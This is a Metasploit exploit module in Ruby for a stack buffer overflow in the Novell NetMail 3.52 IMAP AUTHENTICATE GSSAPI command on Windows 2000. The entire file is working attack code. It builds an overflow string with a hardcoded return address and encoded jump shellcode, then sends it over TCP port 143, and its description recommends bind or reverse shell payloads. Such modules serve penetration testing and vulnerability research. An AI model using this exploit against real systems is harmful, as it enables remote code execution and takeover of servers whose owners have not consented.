##
# $Id: novell_netmail_auth.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell NetMail <=3.52d IMAP AUTHENTICATE Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP AUTHENTICATE
				GSSAPI command. By sending an overly long string, an attacker can overwrite the
				buffer and control program execution. Using the PAYLOAD of windows/shell_bind_tcp
				or windows/shell_reverse_tcp allows for the most reliable results.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'OSVDB', '55175' ],
					[ 'URL', 'http://www.w00t-shell.net/#' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 850,
					'BadChars' => "\x00\x20\x2c\x3a\x40",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP0-SP4 English', { 'Ret' => 0x75022ac4 } ],
				],
			'DisclosureDate' => 'Jan 7 2007',
			'DefaultTarget'  => 0))

		register_options( [ Opt::RPORT(143) ], self.class )
	end

	def exploit
		connect
		sock.get_once

		jmp =  "\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x2f\x77\x28"
		jmp << "\x4b\x83\xeb\xfc\xe2\xf4\xf6\x99\xf1\x3f\x0b\x83\x71\xcb\xee\x7d"
		jmp << "\xb8\xb5\xe2\x89\xe5\xb5\xe2\x88\xc9\x4b"

		sploit  =  "A001 AUTHENTICATE GSSAPI\r\n"
		sploit  << rand_text_alpha_upper(1258) + payload.encoded + "\xeb\x06"
		sploit  << rand_text_alpha_upper(2) + [target.ret].pack('V')
		sploit  << make_nops(8) + jmp + rand_text_alpha_upper(700)

		print_status("Trying target #{target.name}...")
		sock.put(sploit + "\r\n" + "A002 LOGOUT\r\n")

		handler
		disconnect
	end

end
